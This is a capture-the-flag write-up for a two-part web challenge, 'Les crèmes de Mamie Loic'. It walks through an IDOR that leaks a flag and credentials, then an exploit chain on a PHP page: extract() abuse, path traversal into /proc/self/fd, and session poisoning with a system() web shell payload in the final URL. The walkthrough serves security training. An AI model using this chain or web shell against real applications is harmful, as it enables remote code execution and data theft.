# Les crèmes de Mamie Loic (1/2)
The first challenge was an IDOR.  
We have to get the basket of the user `mamie`, so we can just change `/api/getbasket?name=YOUR_USER` to `/api/getbasket?name=mamie` and get the flag : `https://les-cremes-de-madame-loic.ctf.bzh:21000/api/getbasket?name=mamie`  
```
La recette secrete est composee de :
- Lait
- Un maximum de BZHCTF{m4m13_n4_p4s_4ppr1s_d3_c3s_3err3urs!!}
- Caramel
Il faudra aussi penser a mettre des images pour les produits et a gerer la migration de base de donnees, l'implémentation a commencé ici : /mamiesecret
Pour se faire, n'oublie pas d'utiliser les identifiants suivants :
- mamiemanager / sxEpnMggi8LtD1y198Iy
```


# Les crèmes de Mamie Loic (2/2)
We now have the credentials for the user `mamiemanager` and the knowledge of the endpoint `/mamiesecret`.  
Here is the source code :  
```php
  1 <?php
  2 session_start();
  3 if(!isset($_SESSION["name"]) && $_SESSION["name"] !== "mamiemanager")
  4 {
  5     header("Location: /");
  6     die();
  7 }
  8
  9 extract($_GET);
 10
 11 if(isset($page)) include("pages/".$page);
 12 else include("pages/factures.php");
 13
 14 if(isset($source))
 15 {
 16     die(show_source($_SERVER["SCRIPT_FILENAME"]));
 17 }
 18 ?>
```

This is the documentation of the function `extract` :  
```
extract — Import variables into the current symbol table from an array

Warning
Do not use extract() on untrusted data, like user input (e.g. $_GET, $_FILES).
```
:)  
The LFI at the line 11 is obvious.  
We can exploit the call to `extract` to overwrite `$_SERVER["SCRIPT_FILENAME"]` and get an arbitrary file read, but it won't be useful here.  
With the LFI, we can include file in `/proc/self/fd/` which contains the list of files opened by the current process.  
With a bit of bruteforce we find the session file at `/proc/self/fd/10`. The variable `name` is already there, we can use the call to `extract` to overwrite it and insert some php code : `https://les-cremes-de-madame-loic.ctf.bzh:21000/mamiesecret?page=../../../../../../../../../../../../proc/self/fd/10&_SESSION[name]=<?php echo system($_GET["cmd"]);?>&cmd=id`

`BZHCTF{m4m13_4ur41t_du_3ng4g3r_un3_p3rs0nn3_plus_comp3t3nt3s!!}`
